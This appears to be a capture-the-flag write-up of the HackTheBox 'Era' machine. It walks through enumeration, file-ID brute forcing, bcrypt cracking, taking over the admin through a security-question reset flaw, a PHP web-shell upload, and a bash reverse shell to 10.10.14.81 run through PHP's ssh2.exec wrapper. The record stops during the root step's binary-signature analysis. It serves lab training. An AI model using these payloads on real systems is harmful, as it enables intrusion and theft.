---
layout: post
title: "week 11 era"
date: 2025-08-02 00:00:00 -0700
categories: challenges
description: Linux PHP site with binary signing
parent: HackTheBox - Season 8
grand_parent: Challenges
event: "htb-season-8"
tags:
- "signing"
- "php"
- "linux"
- "gcc"
- "medium"
---

# week11-era

## Engagement Notes

This is a vhost segregated web application with a custom php file manager function that allows admin to invoke php wrappers once security questions are reset, then ssh php wrapper allows for remote execution via exfiltrated user database credentials from a hidden backup enumerated through the file manager. Root is obtained via signing a payload with a private key that is exfiltrated from the ftp service, then replacing a monitoring binary.

# Enumeration

### Set variables and baseline functions for further engagement


```python
from utils import * # Use `widget.summary()` to get all the premade code blocks

source =! ip address | grep tun | grep 10 | tr "/" " " | awk '{print $2}'
public_source = requests.get('https://ifconfig.co/ip').text
target = 'era.htb'

print(f"source: {source}")
print(f"target: {target}")
```

    source: ['10.10.14.81']
    target: era.htb


### Port scan target


```python
!rustscan -a $target
```

    .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
    | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
    | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
    `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
    The Modern Day Port Scanner.
    ________________________________________
    : http://discord.skerritt.blog         :
    : https://github.com/RustScan/RustScan :
     --------------------------------------
    Port scanning: Because every port has a story to tell.
    
    [~] The config file is expected to be at "/home/tokugero/.rustscan.toml"
    [~] File limit higher than batch size. Can increase speed by increasing batch size '-b 524188'.
    Open 10.129.19.197:21
    Open 10.129.19.197:80
    [~] Starting Script(s)
    [~] Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-26 19:05 -0700
    Initiating Ping Scan at 19:05
    Scanning 10.129.19.197 [2 ports]
    Completed Ping Scan at 19:05, 0.10s elapsed (1 total hosts)
    Initiating Parallel DNS resolution of 1 host. at 19:05
    Completed Parallel DNS resolution of 1 host. at 19:05, 0.50s elapsed
    DNS resolution of 1 IPs took 0.50s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
    Initiating Connect Scan at 19:05
    Scanning 10.129.19.197 [2 ports]
    Discovered open port 21/tcp on 10.129.19.197
    Discovered open port 80/tcp on 10.129.19.197
    Completed Connect Scan at 19:05, 0.10s elapsed (2 total ports)
    Nmap scan report for 10.129.19.197
    Host is up, received syn-ack (0.097s latency).
    Scanned at 2025-07-26 19:05:30 PDT for 0s
    
    PORT   STATE SERVICE REASON
    21/tcp open  ftp     syn-ack
    80/tcp open  http    syn-ack
    
    Read data files from: /nix/store/wgw89vb58b7xdp5zk2r9fqy2qq3xxdd6-nmap-7.97/bin/../share/nmap
    Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
    


We observe only FTP & HTTP services running on the target host. The landing page for the site doesn't look like there's any actual forms to interact with.

### URL scan target


```python
!gobuster dir -u http://$target -w $(wordlists_path)/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -x txt,js,html,php -t 40 --timeout=6s
```

    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://era.htb
    [+] Method:                  GET
    [+] Threads:                 40
    [+] Wordlist:                /nix/store/095gag0xj3zs6avrxrmn0996im9gzbyz-wordlists-collection/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Extensions:              txt,js,html,php
    [+] Timeout:                 6s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /index.html          0 (0.03%) (Status: 200) [Size: 19493]
    /img                  (Status: 301) [Size: 178] [--> http://era.htb/img/]
    /css                 20 (0.64%) (Status: 301) [Size: 178] [--> http://era.htb/css/]
    /js                  20 (1.12%) (Status: 301) [Size: 178] [--> http://era.htb/js/]
    /fonts               220 (3.15%) (Status: 301) [Size: 178] [--> http://era.htb/fonts/]
    Progress: 89846 / 408220 (22.01%)
    [!] Keyboard interrupt detected, terminating.
    Progress: 90039 / 408220 (22.06%)
    ===============================================================
    Finished
    ===============================================================
    ^C


Since there's not much functionality we're able to enumerate through the front, lets see if there's any vhost routes that I might be able to enumerate.


```python
!gobuster vhost -u http://$target -w$(wordlists_path)/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 40 --timeout=6s --append-domain
```

    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:             http://era.htb
    [+] Method:          GET
    [+] Threads:         40
    [+] Wordlist:        /nix/store/095gag0xj3zs6avrxrmn0996im9gzbyz-wordlists-collection/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
    [+] User Agent:      gobuster/3.6
    [+] Timeout:         6s
    [+] Append Domain:   true
    ===============================================================
    Starting gobuster in VHOST enumeration mode
    ===============================================================
    Foundess: 417 / 114443 (0.36%): file.era.htb Status: 200 [Size: 6765]
    Progress: 16267 / 114443 (14.21%)
    [!] Keyboard interrupt detected, terminating.
    Progress: 16372 / 114443 (14.31%)
    ===============================================================
    Finished
    ===============================================================
    ^C


We see another endpoint here, file.era.htb. But lets take a moment to take a gander at the ftp service before we look at the new target.


```python
!curl -v ftp://$target
```

    * Host era.htb:21 was resolved.
    * IPv6: (none)
    * IPv4: 10.129.19.197
    *   Trying 10.129.19.197:21...
    * Connected to era.htb (10.129.19.197) port 21
    < 220 (vsFTPd 3.0.5)
    > USER anonymous
    < 331 Please specify the password.
    > PASS ftp@example.com
    < 530 Login incorrect.
    * Access denied: 530
    * closing connection #0
    curl: (67) Access denied: 530


There's not much to see with this version, as it's a more modern variant of this service, but there are a couple security advisories relating to potentially MiTM type session redirecting. I'll note these here in my notes, but ultimately they don't seem to be exploitable in this case.

https://ubuntu.com/security/notices/USN-6379-1
CVE-2021-3618


```python
!curl -vI http://$target
```

    * Host era.htb:80 was resolved.
    * IPv6: (none)
    * IPv4: 10.129.19.197
    *   Trying 10.129.19.197:80...
    * Connected to era.htb (10.129.19.197) port 80
    * using HTTP/1.x
    > HEAD / HTTP/1.1
    > Host: era.htb
    > User-Agent: curl/8.14.1
    > Accept: */*
    > 
    * Request completely sent off
    < HTTP/1.1 200 OK
    HTTP/1.1 200 OK
    < Server: nginx/1.18.0 (Ubuntu)
    Server: nginx/1.18.0 (Ubuntu)
    < Date: Sat, 26 Jul 2025 19:20:07 GMT
    Date: Sat, 26 Jul 2025 19:20:07 GMT
    < Content-Type: text/html
    Content-Type: text/html
    < Content-Length: 19493
    Content-Length: 19493
    < Last-Modified: Thu, 12 Dec 2024 17:32:36 GMT
    Last-Modified: Thu, 12 Dec 2024 17:32:36 GMT
    < Connection: keep-alive
    Connection: keep-alive
    < ETag: "675b1e34-4c25"
    ETag: "675b1e34-4c25"
    < Accept-Ranges: bytes
    Accept-Ranges: bytes
    < 
    
    * Connection #0 to host era.htb left intact


Let's start looking at our hidden endpoint.


```python
!curl -v http://file.$target
```

    * Host file.era.htb:80 was resolved.
    * IPv6: (none)
    * IPv4: 10.129.19.197
    *   Trying 10.129.19.197:80...
    * Connected to file.era.htb (10.129.19.197) port 80
    * using HTTP/1.x
    > GET / HTTP/1.1
    > Host: file.era.htb
    > User-Agent: curl/8.14.1
    > Accept: */*
    > 
    * Request completely sent off
    < HTTP/1.1 200 OK
    < Server: nginx/1.18.0 (Ubuntu)
    < Date: Sat, 26 Jul 2025 19:26:22 GMT
    < Content-Type: text/html; charset=UTF-8
    < Transfer-Encoding: chunked
    < Connection: keep-alive
    < Set-Cookie: PHPSESSID=odn7513tm0q0s45ocaqm9bqufj; path=/
    < Expires: Thu, 19 Nov 1981 08:52:00 GMT
    < Cache-Control: no-store, no-cache, must-revalidate
    < Pragma: no-cache
    < 
    <!DOCTYPE html>
    <html lang="en">
     -- snip --
    <body>
        <div class="main-content">
    
        <header>
            <div class="avatar">
                <a href="index.php">
                    <img src="images/main.png" alt="Logo" />
                </a>
            </div>
            <h1>Welcome to Era Storage!</h1>
            <p>Secure. Simple. Smart.</p>
        </header>
    
        <main>
            
        <div class="card">
            <div class="icon"><i class="fas fa-folder"></i></div>
            <h3>Manage Files</h3>
            <p>View and manage your uploaded files.</p>
            <a href="manage.php" class="btn">Go</a>
        </div>
        <div class="card">
            <div class="icon"><i class="fas fa-upload"></i></div>
            <h3>Upload Files</h3>
            <p>Upload new files to your account.</p>
            <a href="upload.php" class="btn">Go</a>
        </div>
        <div class="card">
            <div class="icon"><i class="fas fa-key"></i></div>
            <h3>Update Security Questions</h3>
            <p>Update your security questions.</p>
            <a href="reset.php" class="btn">Go</a>
        </div>
        <div class="card">
            <div class="icon"><i class="fas fa-sign-in-alt"></i></div>
            <h3>Sign In</h3>
            <p>Sign In as a different user.</p>
            <a href="login.php" class="btn">Go</a>
        </div>
        </main>
        <div style="text-align: center; margin-top: 2rem;">
            <p style="font-size: 1rem; color: #555;">
                Alternatively, <a href="security_login.php" style="color: #007bff; text-decoration: none;">login using security questions</a>.
            </p>
        * Connection #0 to host file.era.htb left intact
    </div>


```python
!gobuster dir -u http://file.$target -w $(wordlists_path)/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -x txt,js,html,php -t 40 --timeout=6s --exclude-length 6765
```

    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://file.era.htb
    [+] Method:                  GET
    [+] Threads:                 40
    [+] Wordlist:                /nix/store/095gag0xj3zs6avrxrmn0996im9gzbyz-wordlists-collection/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
    [+] Negative Status codes:   404
    [+] Exclude Length:          6765
    [+] User Agent:              gobuster/3.6
    [+] Extensions:              txt,js,html,php
    [+] Timeout:                 6s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.html                (Status: 403) [Size: 162]
    /images              0 (0.03%) (Status: 301) [Size: 178] [--> http://file.era.htb/images/]
    /download.php         (Status: 302) [Size: 0] [--> login.php]
    /login.php           0 (0.07%) (Status: 200) [Size: 9214]
    /register.php         (Status: 200) [Size: 3205]
    /files               0 (0.11%) (Status: 301) [Size: 178] [--> http://file.era.htb/files/]
    /assets              20 (0.33%) (Status: 301) [Size: 178] [--> http://file.era.htb/assets/]
    /upload.php          20 (0.45%) (Status: 302) [Size: 0] [--> login.php]
    /layout.php          20 (0.78%) (Status: 200) [Size: 0]
    /logout.php          20 (1.40%) (Status: 200) [Size: 70]
    Progress: 9638 / 408220 (2.36%)
    [!] Keyboard interrupt detected, terminating.
    Progress: 9840 / 408220 (2.41%)
    ===============================================================
    Finished
    ===============================================================
    ^C


I'll save the bandwidth on the screenshots, but the there's a couple important bits in this app:

Everything requires authentication. There is a hidden registration endpoint that is open to the public. And there's an alternate login method if you know someone's security questions.

I spent some time going through the initial site to see if I could guess any usernames from the CV on the site but none seemed to come back with valid users and wrong password errors. I found if I registered an account, I could upload and download files, and it seemed to assign my download a random numeric ID under 1000. The download function didn't seem to care what my file type was, and the upload didn't appear to have any filters. I couldn't browse to any endpoints that I would expect to have found files (like /files/<myfile> which just results in 403).

I'll document my scripted approach and walk through my thoughts:

All posts are made with a simple param payload. These same calls can easily be made in burpsuite, or just curl. I use python here as I find it more readable.

We start by making my user.


```python
payload = {
    'username': 'tokugero',
    'password': 'tokugero',
}

file_session = requests.Session()
register = file_session.post(f'http://file.{target}/register.php', data=payload)

```

Then we log in with our user data, but we need to add a field to get through the process.


```python
payload["submitted"] = "true"
login = file_session.post(f'http://file.{target}/login.php', data=payload)
print(file_session.cookies.get_dict())
```

    {'PHPSESSID': '2dpriqngp31ppllop56m642083'}


Finally we can try uploading a file, I simply copied a working upload call and transcribed it to python requests.


```python
upload_file = {
    'fsubmitted': (None, 'true'),
    'upfile[]': ('%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'content', 'application/x-php')
}
upload = file_session.post(f'http://file.{target}/upload.php', files=upload_file)
print(upload.status_code)
```

    200


When saving a file, there's a random ID assigned to the file that seems to be a 4 digit number. At the time I didn't know if it was always a 4 digit number (i.e. 0001 - 9999 or 1-9999), so I started with the simpler code and didn't need to try the other. Note that this is a bit more cumbersom code than normal just to get through the enumeraton faster. This could just as easily be done with a basic for loop and more patience. 

Enumerating them all yields as follows:


```python
import os
from concurrent.futures import ThreadPoolExecutor

os.makedirs('enumerated_files', exist_ok=True)

def fetch_and_save(i):
    download = file_session.get(f'http://file.{target}/download.php?id={i}&dl=true')
    if download.status_code == 200 and "File Not Found" not in download.text:
        print(f"Found file with id {i}:")
        with open(f'enumerated_files/id_{i}.txt', 'w') as f:
            f.write(download.text)
    if i % 500 == 0:
        print(f"Processed {i} files...")

with ThreadPoolExecutor(max_workers=8) as executor:
    executor.map(fetch_and_save, range(0, 9999))
```

    Processed 0 files...
    Found file with id 54:
    Found file with id 150:
    Processed 500 files...
    Processed 1000 files...
    Processed 1500 files...
    Processed 2000 files...
    Processed 2500 files...
    Found file with id 2885:
    Processed 3000 files...
    Processed 3500 files...
    Processed 4000 files...
    Processed 4500 files...
    Processed 5000 files...
    Processed 5500 files...
    Processed 6000 files...
    Processed 6500 files...
    Processed 7000 files...
    Processed 7500 files...
    Processed 8000 files...
    Processed 8500 files...
    Processed 9000 files...
    Processed 9500 files...


2885 is my uploaded file, the other two seem interesting.


```python
!file enumerated_files/id_54.txt
!file enumerated_files/id_150.txt
```

    enumerated_files/id_54.txt: Zip archive data, requires at least v2.0 to extract
    enumerated_files/id_150.txt: Zip archive data, requires at least v2.0 to extract


Downloading these files from the site yields the following directory after extracting the two zips:


```python
!ls enumerated_files
```

    bg.jpg		      key.pem		screen-download.png
    css		      layout_login.php	screen-login.png
    download.php	      layout.php	screen-main.png
    filedb.sqlite	      LICENSE		screen-manage.png
    files		      login.php		screen-upload.png
    functions.global.php  logout.php	security_login.php
    id_150.txt	      main.png		signing.zip
    id_1795.txt	      manage.php	site-backup-30-08-24.zip
    id_54.txt	      register.php	upload.php
    index.php	      reset.php		webfonts
    initial_layout.php    sass		x509.genkey


I didn't bother separating them because I'm lazy, but x509.genkey & key.pem were part of a file called `signing.zip` and the rest are from a `site-backup-30-08-24.zip`

We see database, we dump database.

```sh
 sqlite3 filedb.sqlite                                                      
SQLite version 3.50.1 2025-06-06 14:52:32
Enter ".help" for usage hints.
sqlite> .tables
files  users

sqlite> select * from users;
1|admin_ef01cab31aa|$2y$10$wDboh<snip>If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1Rz<snip>QLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8U<snip>Q805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf<snip>uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.<snip>22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LA<snip>DpuUV/dh/a1wC|-1|||
```

Running these through hashcat yields that these are bcrypt, and running that through rockyou gives at least the following:

```sh
 hashcat -m 3200 era.users $(wordlists_path)/rockyou.txt
...
$2y$10$S9EOSDqF1RzNUv<snip>hSV2Qvxm:america # eric
$2b$12$HkRKUdjjOdf2Wu<snip>jRqwEL2.:mustang # yuri
```

The admin alternative passwords don't seem to work as they are, but yuri appears to work in FTP:

```sh
 ftp era.htb
Connected to era.htb.
220 (vsFTPd 3.0.5)
Name (era.htb:tokugero): yuri
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
226 Directory send OK.
```

The apache directory gives some context over how the site is built, like our absolute directory path is /var/www/file for our custom file app for example.

```sh
ftp> cd apache2_conf
250 Directory successfully changed.
ftp> ls
227 Entering Passive Mode (10,129,19,197,240,30).
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1332 Dec 08  2024 000-default.conf
-rw-r--r--    1 0        0            7224 Dec 08  2024 apache2.conf
-rw-r--r--    1 0        0             222 Dec 13  2024 file.conf
-rw-r--r--    1 0        0             320 Dec 08  2024 ports.conf
226 Directory send OK.
```

The php directory gives us 2 clues: 1) what modules we might have loaded, and 2) that our admins like to build stuff from source.

```sh
ftp> cd php8.1_conf
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 build
-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so
-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so
-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so
-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so
-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so
-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so
-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so
-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so
-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so
-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so
-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so
226 Directory send OK.
```

Just to see what type of key we're actually looking at, we can inspect it to reveal a x509 cert which we could have guessed from the config file name.



```python
!cat enumerated_files/x509.genkey
!openssl x509 -in enumerated_files/key.pem -text -noout
```

    [ req ]
    default_bits = 2048
    distinguished_name = req_distinguished_name
    prompt = no
    string_mask = utf8only
    x509_extensions = myexts
    
    [ req_distinguished_name ]
    O = Era Inc.
    CN = ELF verification
    emailAddress = yurivich@era.com
    
    [ myexts ]
    basicConstraints=critical,CA:FALSE
    keyUsage=digitalSignature
    subjectKeyIdentifier=hash
    authorityKeyIdentifier=keyid


    Certificate:
        Data:
            Version: 3 (0x2)
            Serial Number:
                6d:63:4a:a9:81:e1:93:a1:e4:48:c5:20:5f:f7:9b:84:e6:b6:f5:0b
            Signature Algorithm: sha256WithRSAEncryption
            Issuer: O=Era Inc., CN=ELF verification, emailAddress=yurivich@era.com
            Validity
                Not Before: Jan 26 02:09:35 2025 GMT
                Not After : Jan  2 02:09:35 2125 GMT
            Subject: O=Era Inc., CN=ELF verification, emailAddress=yurivich@era.com
            Subject Public Key Info:
                Public Key Algorithm: rsaEncryption
                    Public-Key: (2048 bit)
                    Modulus:
                        00:aa:28:7d:f4:f9:16:63:93:18:95:24:c9:ee:07:
                        a6:f5:74:36:d6:51:ac:37:a7:64:32:42:f5:8c:6c:
                        5b:ec:8b:bc:c6:d6:41:36:2c:1a:ca:8e:c1:32:bd:
                        cc:68:f2:6d:30:2f:d7:de:b8:58:8e:95:c8:83:31:
                        a9:84:2c:c0:16:d1:48:cc:c9:ec:34:d7:e4:be:6c:
                        01:1c:39:ac:07:f3:56:d5:6a:1c:4d:90:0e:21:1e:
                        2f:5d:fe:bc:ac:4d:ef:dd:9c:d9:21:d3:c2:a0:1e:
                        1c:c5:99:30:29:8d:b5:74:31:0c:14:0c:e2:d7:4b:
                        0f:5e:1d:df:b5:54:90:a5:c2:1c:00:b0:be:31:76:
                        4e:29:41:2e:9d:02:e2:44:9f:1d:c8:cc:da:10:db:
                        77:fe:74:fa:93:08:c0:00:59:24:fa:ed:53:d9:8d:
                        28:f0:5b:5f:c7:1c:d8:b5:d9:e3:de:c0:42:51:18:
                        1f:b6:2b:e6:1e:1a:3f:a5:c5:28:56:fc:8d:63:60:
                        41:e7:b0:ea:e5:88:cd:a1:66:f3:8b:a9:2f:4b:8e:
                        1a:9f:23:df:90:d5:1c:48:40:5e:bd:c8:01:14:78:
                        de:25:62:ea:5a:d0:68:6b:da:1f:7a:60:b4:44:e5:
                        8c:97:68:1c:5d:48:0e:20:2c:63:95:1d:98:0c:97:
                        68:bf
                    Exponent: 65537 (0x10001)
            X509v3 extensions:
                X509v3 Basic Constraints: critical
                    CA:FALSE
                X509v3 Key Usage: 
                    Digital Signature
                X509v3 Subject Key Identifier: 
                    FD:76:05:FC:BC:D6:04:CA:FE:36:16:70:FC:F1:D4:95:01:DB:D2:CD
        Signature Algorithm: sha256WithRSAEncryption
        Signature Value:
            0c:c4:78:d4:31:20:91:fa:67:cb:ce:bc:ff:20:d4:ea:32:0f:
            43:ad:f4:4f:14:fc:f7:71:94:ce:d0:5a:a9:3d:a9:c1:f4:c7:
            24:19:aa:0e:c4:7b:92:ff:92:ae:32:ff:58:b5:67:10:0f:94:
            17:ce:53:1e:0a:85:98:16:56:44:ad:7e:fb:ad:d0:89:60:dd:
            54:97:56:7b:4f:3d:18:bc:58:07:03:57:99:e2:bd:8b:69:86:
            fd:7a:65:09:1a:72:51:72:74:dd:26:61:07:36:36:5a:83:bf:
            ec:b9:14:a9:c6:6e:48:a8:45:45:46:1a:69:08:a9:e6:93:e0:
            72:14:03:60:85:46:74:eb:d8:96:a8:d1:3c:00:20:6d:23:7e:
            9a:2f:fb:2f:ed:d9:68:54:36:da:3d:2f:4e:2f:70:3d:d9:03:
            3b:84:3d:99:ea:b3:f2:fd:ae:ca:03:67:51:1e:dc:3c:67:38:
            2e:e5:dc:f9:24:95:a2:22:0e:b5:e2:1c:09:1d:36:b8:3b:37:
            d5:c2:79:0a:f4:15:44:b4:c4:b3:01:31:50:84:25:3d:93:0a:
            8e:a5:5c:ab:5c:23:90:39:16:00:1c:c8:40:83:ce:4c:3e:1d:
            d8:12:60:53:da:a1:82:6a:e6:bc:47:fb:18:6e:0e:a4:43:af:
            de:35:4a:0e


I do find that I am able to arbitrarily reset any users security questions by simply providing a valid username before the reset. This wasn't as much static analysis on the code that revealed that as much as a weird sensation I was given when a password reset form asked for the authenticated user's username. Very much a "Try it and see" moment.

By using the admin_ef01cab31aa user identified in the user dump, and using any reset security questions, I can authenticate as admin_ef01cab31aa. Thre's new functionality with this user that's hidden from the UI that we do find in the source we might be able to abuse.

```php
// BETA (Currently only available to the admin) - Showcase file instead of downloading it
	} elseif ($_GET['show'] === "true" && $_SESSION['erauser'] === 1) {
    		$format = isset($_GET['format']) ? $_GET['format'] : '';
    		$file = $fetched[0];

		if (strpos($format, '://') !== false) {
        		$wrapper = $format;
        		header('Content-Type: application/octet-stream');
    		} else {
        		$wrapper = '';
        		header('Content-Type: text/html');
    		}

    		try {
        		$file_content = fopen($wrapper ? $wrapper . $file : $file, 'r');
			$full_path = $wrapper ? $wrapper . $file : $file;
			// Debug Output
			echo "Opening: " . $full_path . "\n";
        		echo $file_content;
    		} catch (Exception $e) {
        		echo "Error reading file: " . $e->getMessage();
    		}
```

The code itself, when invoked, doesn't actually show the contents, it just shows the file handle. It DOES tell us that we successfully opened a file though.

![alt text](../../../assets/images/ctf/events/season8-htb-25/2025-08-02-week11-era.md/2025-08-02-week11-era/images/image.png)

Let's automate some of this to make playing with the payload easier. 

Lets start by reseting our admin's security questions using the attacker session.


```python
payload = {
    'username': 'admin_ef01cab31aa',
    'new_answer1': 'aaaa',
    'new_answer2': 'aaaa',
    'new_answer3': 'aaaa',
}
reset_admin = file_session.post(f'http://file.{target}/reset.php', data=payload)
```

With the new security questions reset, we can now log in as admin_ef01cab31aa.


```python
payload = {
    'username': 'admin_ef01cab31aa',
    'answer1': 'aaaa',
    'answer2': 'aaaa',
    'answer3': 'aaaa',
}

admin_session = requests.Session()
login = admin_session.post(f'http://file.{target}/security_login.php', data=payload)
if "Login successful." in login.text:
    print("Successfully logged in as admin!")
else:
    print("Failed to log in as admin.")
print(admin_session.cookies.get_dict())
```

    Successfully logged in as admin!
    {'PHPSESSID': '95shliirm72gcsm1iifc0ckujd'}


And finally we can dynamically upload any file we want, and set the fileid for later so we can call it on the download endpoint.


```python
upload_file = {
    'fsubmitted': (None, 'true'),
    # Note that here is where we set the filename that will be saved on the remote system, as well as the contents of the file.
    'upfile[]': ('file2.php', '<?php echo system($_REQUEST["cmd"]); ?>', 'application/x-php')
}
upload = admin_session.post(f'http://file.{target}/upload.php', files=upload_file)
soup = BeautifulSoup(upload.text, 'html.parser')
download_link = soup.find('div', id='download-link')
if download_link:
    download_input = download_link.find('input', id='download-url')
    if download_input and download_input.has_attr('value'):
        download_url = download_input['value']
        print(f"Download URL: {download_url}")
        fileid = download_url.split('=')[-1]
else:
    print("Download URL input not found. Probably unauthed or duplicate filename")


```

    Download URL: http://file.era.htb/download.php?id=4602


I spent a lot of time here doing other things, like looking at oracle attacks that failed because there's no reflection, looking through LFI potentialities to see if I could invoke some data in some other way or navigate paths at least, and seeing if I could phone home. I did find that the HTTP wrapper worked and would reach out to me.

After spending time perusing the ftp server's php folder, I found ssh2 was in here and I hadn't used this module before.

[PHP ssh2 wrapper](https://www.php.net/manual/en/wrappers.ssh2.php)

This wrapper allows PHP to do some work in executing, tunneling, and copying files natively through PHP. I started this payload by seeing if I could simply touch to an open nc session on /dev/myip/myport, which worked after I tested from the users I had dumped earlier. Eric has access to ssh to the server, and the server must be listening to 22 on 127.0.0.1 to let this happen without letting me log in remotely!

What you see below is the culmnation of my iterations, rather than the encyclopedia of my failures.


```python
import urllib.parse
# Set the bash command, it can be anything as long as it's encoded
# Note that I added a # to comment out the file name that will be passed in later
command = "/bin/bash -i >& /dev/tcp/10.10.14.81/9999 0>&1#"
# Encode this for URL encoding to package the payload properly
encoded_command = urllib.parse.quote(command)
# Verify the payload results
print(encoded_command)

# ACTUALLY USE the encoder_command and not the raw command. i definitely did. For sure.
preface = f'ssh2.exec://eric:america@localhost:22/{encoded_command}'
print(fileid)
# Make sure to have a listener running and ship it. 
show_file = admin_session.get(f'http://file.{target}/download.php?id={fileid}&show=true&format={preface}')
print(show_file.text)
print(admin_session.cookies.get_dict())
```

    /bin/bash%20-i%20%3E%26%20/dev/tcp/10.10.14.81/9999%200%3E%261%23
    4602
    <html>
    <head><title>504 Gateway Time-out</title></head>
    <body>
    <center><h1>504 Gateway Time-out</h1></center>
    <hr><center>nginx/1.18.0 (Ubuntu)</center>
    </body>
    </html>
    
    {'PHPSESSID': '95shliirm72gcsm1iifc0ckujd'}


That gateway timeout on this end is because I'm too busy celebrating on another terminal.

```sh
 nc -lvn 9999
Listening on 0.0.0.0 9999
Connection received on 10.129.19.197 48758
bash: cannot set terminal process group (16912): Inappropriate ioctl for device
bash: no job control in this shell
eric@era:~$ ls
ls
user.txt
eric@era:~$ cat user.txt
cat user.txt
1396c609a0ddc3a1e64c50921706ebc7
eric@era:~$ netstat -tulpn
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:22            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -   
```

Here we prove that ssh really is listening on a local interface.

Going through the system we find that /opt has a binary in a folder called `/opt/AV/periodic-checks` called `monitor` that looks to have some functionality that prints some status codes to a log file in the same directory. 

This is a standard ELF executable, and running strings on it to see if we can get some hint on its functionality, we see that yuri's name is included, in fact: yurivich's full name from the cert we found on FTP seems to be in here hinting that this binary was signed in some way with that private key potentially. 

Looking through the contents of the global table, we can see that there's a section included called `.text_sig` and this is the section that actually includes that name with some binary wrapped around it.

```sh
eric@era:~$ readelf -x .text_sig monitor
readelf -x .text_sig monitor

Hex dump of section '.text_sig':
  0x00000000 308201c6 06092a86 4886f70d 010702a0 0.....*.H.......
  0x00000010 8201b730 8201b302 0101310d 300b0609 ...0......1.0...
  0x00000020 60864801 65030402 01300b06 092a8648 `.H.e....0...*.H
  0x00000030 86f70d01 07013182 01903082 018c0201 ......1...0.....
  0x00000040 01306730 4f311130 0f060355 040a0c08 .0g0O1.0...U....
  0x00000050 45726120 496e632e 31193017 06035504 Era Inc.1.0...U.
  0x00000060 030c1045 4c462076 65726966 69636174 ...ELF verificat
  0x00000070 696f6e31 1f301d06 092a8648 86f70d01 ion1.0...*.H....
